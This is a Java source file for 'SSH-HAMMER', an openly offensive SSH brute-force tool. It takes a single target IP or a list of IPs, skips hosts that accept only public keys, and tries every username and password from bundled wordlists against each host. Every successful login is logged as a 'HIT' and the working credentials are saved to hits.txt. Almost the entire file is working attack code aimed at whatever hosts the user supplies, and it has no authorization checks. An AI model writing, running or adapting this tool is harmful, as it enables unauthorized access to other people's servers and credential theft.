package xyz.becvar.sshhammer;

import xyz.becvar.sshhammer.utils.*;
import xyz.becvar.sshhammer.utils.console.ConsoleColors;
import xyz.becvar.sshhammer.utils.console.Logger;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.Scanner;

public class Main {

    // default variables
    public static String APP_NAME = "SSH-HAMMER";

    // init objects
    public static Scanner scanner = new Scanner(System.in);
    public static Logger logger = Logger.INSTANCE;

    // init basic variables
    public static boolean useIPList = false;
    public static String targetIP = null;
    public static int targetPort = 22;
    public static int maxTimeOutSeconds = 5;

    // MAIN APP FUCTION
    public static void main(String[] args) {

        // create default usernames list
        if (!FileUtils.ifFileExist("usernames.txt")) {
            ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("usernames.txt"), "usernames.txt");
        }

        // create default passwords list
        if (!FileUtils.ifFileExist("passwords.txt")) {
            ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("passwords.txt"), "passwords.txt");
        }

        // question use ip-list.txt
        logger.logInLine("Do you want to use ip-list.txt [Y/N]: ");

        // check if use ip-list
        if (!scanner.nextLine().equalsIgnoreCase("n")) {
            useIPList = true;

            // create default ip-list.txt
            if (!FileUtils.ifFileExist("ip-list.txt")) {
                ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("ip-list.txt"), "ip-list.txt");
            }

        } else {

            // question target ip
            logger.logInLine("Enter target ip: ");

            // get ip form scanner and save to var
            targetIP = scanner.nextLine();

            // check if target ip is valid
            if (!NetworkUtils.checkIPv4(targetIP)) {
                logger.logError("Error: your target ip is not valid ip format");
                SystemUtils.appShutdown(0);
            }
        }

        // question to target port
        logger.logInLine("Enter target port [default is 22]: ");

        // temp port var
        String enterPort = scanner.nextLine();

        // check if port entered
        if (!enterPort.isEmpty()) {

            // check if enter port is numeric format
            if (StringUtils.isNumeric(enterPort)) {

                // save new target port
                targetPort = Integer.parseInt(enterPort);
            }
        }

        // question for max timeout seconds
        logger.logInLine("Enter max connection timeout [default is 5s]: ");

        // temp timeout seconds
        String timeOutTemp = scanner.nextLine();

        // check if not default
        if (!timeOutTemp.isEmpty()) {
            // check if seconds is numeric
            if (StringUtils.isNumeric(timeOutTemp)) {

                // save new timeout seconds
                maxTimeOutSeconds = Integer.parseInt(timeOutTemp);
            }
        }

        // check if used ip-list
        if (useIPList) {

            // check if ip-list found
            if (!FileUtils.ifFileExist("ip-list.txt")) {
                Logger.INSTANCE.logError("Error: ip-list.txt not found");
                SystemUtils.appShutdown(0);
            } else {

                try (BufferedReader br = new BufferedReader(new FileReader("ip-list.txt"))) {
                    String ipToAttack;

                    // for all ips in iplist.txt
                    while ((ipToAttack = br.readLine()) != null) {

                        // check if ipv4 reachable ssh
                        if (!NetworkUtils.isReachable(ipToAttack, targetPort, maxTimeOutSeconds * 1000)) {
                            logger.logError("'"+ ipToAttack + ":" + targetPort + "'" + " -> SSH unreachable");
                        } else {

                            // check if using publickey
                            if (NetworkUtils.publickeyOnlyCheck("test", targetPort, ipToAttack, "1234")) {

                                logger.logError("host: " + ipToAttack + " using publickey only = skipped");

                                // skip loop
                                continue;
                            } else {
                                connectSSH(ipToAttack, targetPort);
                            }
                        }

                        // delete scanned ip from list
                        FileUtils.removeLineFromFile("ip-list.txt", ipToAttack);
                    }
                } catch (IOException e) {
                    Logger.INSTANCE.logError(e.getMessage());
                }
            }
        } else {

            // check if ipv4 reachable ssh
            if (!NetworkUtils.isReachable(targetIP, targetPort, maxTimeOutSeconds * 1000)) {
                logger.logError("'"+ targetIP + ":" + targetPort + "'" + " -> SSH unreachable");
            } else {
                connectSSH(targetIP, targetPort);
            }
        }

        // log end msg
        logger.log("Attack is ended!");

        // check if hits found
        if (FileUtils.ifFileExist("hits.txt")) {
            logger.log("You can found found connection in hits.txt");
        }

        // end app
        SystemUtils.appShutdown(0);
    }

    // main SSH connect function
    public static void connectSSH(String host, int port) {

        // check if usernames list exist
        if (FileUtils.ifFileExist("usernames.txt")) {

            try (BufferedReader br = new BufferedReader(new FileReader("usernames.txt"))) {
                String user;

                // for all users in usernames.txt
                while ((user = br.readLine()) != null) {

                    // check if password list exist
                    if (FileUtils.ifFileExist("passwords.txt")) {

                        try (BufferedReader br1 = new BufferedReader(new FileReader("passwords.txt"))) {
                            String password;

                            // for all passwwords in passwords.txt
                            while ((password = br1.readLine()) != null) {

                                // main connect function call
                                if (NetworkUtils.sshConnectionValid(user, port, host, password)) {
                                    // print connection hit sucess
                                    logger.log(ConsoleColors.CODES.ANSI_GREEN + "HIT: " + host + ":" + port + " with " + user + ":" + password + " connection sucess");

                                    FileUtils.saveMessageLog("host: " + host + ":" + port + " connect with: " + user + ":" + password, "hits.txt");
                                } else {

                                    // print connection error
                                    logger.log(ConsoleColors.CODES.ANSI_YELLOW + host + ":" + port + " -> " + user + ":" + password + " not connected");
                                }

                                // print spacer
                                logger.printSpacer();
                            }
                        } catch (IOException e) {
                            logger.logError(e.getMessage());
                        }

                    } else {
                        // log file not exist error
                        logger.logError("Error passwords.txt not found");
                        SystemUtils.appShutdown(0);
                    }
                }
            } catch (IOException e) {
                logger.logError(e.getMessage());
            }

        } else {
            // log file not exist error
            logger.logError("Error usernames.txt not found");
            SystemUtils.appShutdown(0);
        }
    }
}
